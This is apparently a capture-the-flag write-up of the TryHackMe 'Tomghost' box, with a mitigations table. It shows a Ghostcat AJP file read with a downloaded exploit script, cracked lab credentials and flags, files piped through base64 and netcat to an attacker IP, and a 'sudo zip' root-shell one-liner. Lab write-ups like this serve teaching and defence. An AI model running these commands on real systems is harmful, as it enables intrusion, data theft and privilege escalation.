```
 ████████╗ ██████╗ ███╗   ███╗ ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
 ╚══██╔══╝██╔═══██╗████╗ ████║██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
    ██║   ██║   ██║██╔████╔██║██║  ███╗███████║██║   ██║███████╗   ██║
    ██║   ██║   ██║██║╚██╔╝██║██║   ██║██╔══██║██║   ██║╚════██║   ██║
    ██║   ╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
    ╚═╝    ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝
               TryHackMe: Tomghost
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-20 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~11 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: SSH (22), tcpwrapped (53), AJP (8009), Tomcat (8080)
- [x] Feroxbuster on port 8080: standard Tomcat docs/examples, nothing custom
- [x] Identified Tomcat 9.0.30 + exposed AJP 8009 → Ghostcat (CVE-2020-1938)
- [x] Ran `ajpShooter.py` to read `/WEB-INF/web.xml` via AJP
- [x] Found SSH credentials (`skyfuck`) embedded in `web.xml` description tag
- [x] SSH login as `skyfuck`
- [x] Found `credential.pgp` and `tryhackme.asc` in home directory
- [x] Exfiltrated both files via base64 + Netcat
- [x] `gpg2john` + John the Ripper → GPG key passphrase `alexandru`
- [x] Imported GPG key, decrypted `credential.pgp` → `merlin`'s SSH password
- [x] SSH login as `merlin`: retrieved user flag
- [x] `sudo -l` → `zip` with NOPASSWD
- [x] GTFOBins zip symlink trick → root shell
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 🐍 ajpShooter.py: Ghostcat (CVE-2020-1938) AJP file read exploit
- 🔑 SSH: credential-based shell access
- 🔓 gpg2john + John the Ripper: GPG private key passphrase cracking
- 🔐 GPG: decrypting the credential file

---

## ⚡ TL;DR

Tomcat 9.0.30 with AJP exposed on port 8009 is vulnerable to Ghostcat (CVE-2020-1938): an unauthenticated file read via the AJP protocol. Reading `/WEB-INF/web.xml` leaked SSH credentials directly in the file's description tag. From there, two encrypted files (a PGP-encrypted credential and a GPG private key) were exfiltrated via base64-over-netcat, the GPG passphrase cracked with John, and the decrypted credential gave SSH access to a second user. `sudo zip` with the classic symlink/shell trick finished the job.

---

## 📖 Introduction

Today's target is **Tomghost**: a box built entirely around one specific, well-documented CVE: Ghostcat. Apache Tomcat's AJP connector, when left exposed without authentication, allows an attacker to read any file within the web application context: no credentials required. This box demonstrates exactly how dangerous that primitive is: one file read exposes a username and password pair, planted directly in a configuration file by the box author as the "treasure" Ghostcat reveals. From there it's a fairly standard chain of file exfiltration, GPG cracking, and a `sudo zip` escalation that's been a GTFOBins staple for years.

### Prerequisites

Readers are assumed to know:

- What the AJP (Apache Jserv Protocol) is and why Ghostcat (CVE-2020-1938) is dangerous
- How to exfiltrate binary files over a netcat connection using base64 encoding
- What GPG/PGP encryption is and how `gpg2john` enables cracking encrypted private keys
- What GTFOBins documents about `zip`'s `-T -TT` test-and-execute flags

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

```bash
rustscan -a 10.49.139.97 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 53/tcp | tcpwrapped | unidentified |
| 8009/tcp | AJP | Apache Jserv Protocol 1.3 |
| 8080/tcp | HTTP | Apache Tomcat 9.0.30 |

The pairing of **AJP on 8009** and **Tomcat 9.0.30** is the entire story of this box. Tomcat 9.0.30 falls within the vulnerable version range for Ghostcat.

### Web Directory Enumeration

Feroxbuster on port 8080 returns the standard Tomcat installation: documentation, example apps, the manager interface (403 forbidden, as expected without credentials). Nothing custom was deployed. The vulnerability isn't in any web content; it's in the AJP connector itself.

---

## 🚪 Foothold

*(~8 mins into the box)*

### Ghostcat: CVE-2020-1938

**What is Ghostcat?** The AJP protocol is designed for communication *between* a web server (like Apache HTTPD) and Tomcat's servlet container: it's meant to be used internally, not exposed to the public internet. When AJP is reachable externally and Tomcat's `requestedSessionId` and file-read attributes aren't properly restricted, an attacker can request arbitrary files from within the web application's `WEB-INF` directory: including configuration files: entirely without authentication. This is classified as a file read/inclusion vulnerability, and depending on the application, it can be escalated to remote code execution if file upload functionality also exists.

*Downloading the public Ghostcat exploit tool:*

```bash
wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py
```

*Reading `WEB-INF/web.xml` via the AJP connector:*

```bash
python3 ajpShooter.py http://10.49.139.97 8009 /WEB-INF/web.xml read
```

```xml
<web-app ...>
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>
</web-app>
```

Credentials sitting directly inside the application's deployment descriptor: about as deliberate a placement as a CTF box can manage. Username `skyfuck`, password `8730281lkjlkjdqlksalks`.

### Credentials Found

| Username | Password | Where Found |
| --- | --- | --- |
| `skyfuck` | `8730281lkjlkjdqlksalks` | `WEB-INF/web.xml` via Ghostcat |

---

## 🐚 Shell / Access

*(~12 mins into the box)*

```bash
ssh skyfuck@10.49.139.97
# Password: 8730281lkjlkjdqlksalks
```

```
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc

skyfuck@ubuntu:~$ ls /home
merlin  skyfuck

skyfuck@ubuntu:~$ cat /home/merlin/user.txt
THM{GhostCat_1s_so_cr4sy}
```

The user flag is readable directly without any further escalation: `merlin`'s home directory permissions allow it. The two files in `skyfuck`'s home (`credential.pgp` and `tryhackme.asc`) are the path forward to a proper shell as `merlin`.

### File Exfiltration via Base64 + Netcat

There's no SCP/SFTP convenience here: files are pulled out manually by base64-encoding them on the target and piping the output to a netcat connection back to the attacking machine.

*On the target, encoding and sending each file:*

```bash
base64 credential.pgp | nc 192.168.134.217 4444
```

*On the attacker, listening and capturing:*

```bash
nc -lnvp 4444 > credential.pgp.b64
```

Repeated for `tryhackme.asc`. Both files decoded locally:

```bash
base64 -d credential.pgp.b64 > credential.pgp
base64 -d tryhackme.asc.b64 > tryhackme.asc
```

---

## 📈 Escalation: skyfuck → merlin

*(~20 mins into the box)*

### GPG Key Passphrase Cracking

`tryhackme.asc` is a GPG private key (ASCII-armoured). `credential.pgp` is presumably encrypted with the corresponding public key: meaning the private key's passphrase needs cracking first.

*Converting the GPG key for John:*

```bash
gpg2john tryhackme.asc > tryhackme.asc.john
john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.asc.john
```

```
alexandru   (tryhackme)
```

Passphrase: `alexandru`.

*Importing the now-usable key:*

```bash
gpg --import tryhackme.asc
```

The first import attempt returned "Operation cancelled": a GPG-agent passphrase prompt was dismissed inadvertently. Running the import a second time and providing the passphrase correctly succeeded:

```
gpg: key 8F3DA3DEC6707170: secret key imported
```

*Decrypting the credential file:*

```bash
gpg --decrypt credential.pgp
```

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

SSH credentials for `merlin`.

*SSH login:*

```bash
ssh merlin@10.49.139.97
```

```
merlin@ubuntu:~$ ls
user.txt
```

---

## 📈 Escalation: merlin → root

*(~25 mins into the box)*

### sudo zip: GTFOBins

```bash
sudo -l
```

```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

**Why is `sudo zip` dangerous?** `zip` supports a testing mode (`-T`) that, on failure, can execute an arbitrary command specified with `-TT`. This was originally intended to let users specify a custom unzip test command, but it executes that command as a shell call with no restriction on what it contains. When `zip` runs as root via `sudo`, the test command also runs as root.

*The GTFOBins one-liner:*

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

```
adding: etc/hosts (deflated 31%)
# whoami
root
```

*Collecting the root flag:*

```bash
cat /root/root.txt
```

```
THM{Z1P_1S_FAKE}
```

---

## 💥 Exploitation

The complete attack chain:

1. **Ghostcat (CVE-2020-1938)** via `ajpShooter.py` → read `WEB-INF/web.xml` → `skyfuck` credentials
2. **SSH as `skyfuck`** → user flag readable directly; two encrypted files found
3. **Base64 + Netcat exfiltration** → `credential.pgp` and `tryhackme.asc` retrieved locally
4. **gpg2john + John** → GPG passphrase `alexandru`
5. **GPG decrypt** → `merlin`'s SSH credentials
6. **SSH as `merlin`** → `sudo zip` GTFOBins → root shell → root flag

---

## 🐇 Rabbit Holes

### GPG Import "Operation Cancelled"

The first `gpg --import tryhackme.asc` attempt failed with "Operation cancelled": GPG's pinentry agent prompted for the passphrase in a way that got dismissed (likely a terminal/TTY interaction issue rather than a wrong passphrase). Simply re-running the exact same import command a second time succeeded cleanly. No configuration change was needed: just a retry.

### Searching for a Public Exploit for Tomcat 9.0.30 Directly

Initial searches focused on Tomcat-version-specific RCEs rather than the AJP connector. Tomcat 9.0.30 itself has no major unauthenticated RCE in that exact version. The actual vulnerability (Ghostcat) is a connector-level issue affecting *any* Tomcat version with AJP exposed, regardless of the HTTP-facing version number: a reminder to check exposed *protocols*, not just the headline web server version.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{GhostCat_1s_so_cr4sy}` | `/home/merlin/user.txt` |
| Root | `THM{Z1P_1S_FAKE}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Ghostcat (CVE-2020-1938): AJP exposed without auth | Critical | Update Tomcat to a patched version (9.0.31+, 8.5.51+, 7.0.100+); disable the AJP connector entirely if not needed; if required, bind it to localhost only and set `requiredSecret` |
| Credentials embedded in `web.xml` description tag | Critical | Never store credentials in application configuration files, especially ones potentially exposed via file-read vulnerabilities |
| Sensitive encrypted files left in a user's home directory | Medium | Restrict home directory permissions; don't leave decryption-pending sensitive files lying around indefinitely |
| Weak GPG key passphrase (`alexandru`) crackable via rockyou.txt | High | Use a long, randomly generated passphrase for any GPG/PGP key |
| `sudo zip` with NOPASSWD | Critical | Remove `zip` from `sudoers`; check every binary against GTFOBins before granting unrestricted `sudo` access |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Always check exposed protocols, not just the headline application version: Ghostcat is a connector-level vulnerability that exists independently of which Tomcat version is serving HTTP traffic. AJP was never meant to face the public internet; its mere presence on an externally reachable port is itself the vulnerability, regardless of what patches are applied elsewhere.

---

## 🔁 If I Did It Again

Check for AJP (port 8009) immediately whenever Tomcat is identified, before searching for version-specific Tomcat RCEs: Ghostcat affects a much wider range of deployments than any single CVE tied to a specific Tomcat release, and it's usually the faster path in.

---

## 🔚 Changelog

*Last updated: 2026-06-20*

---

[↑ Back to top](#)
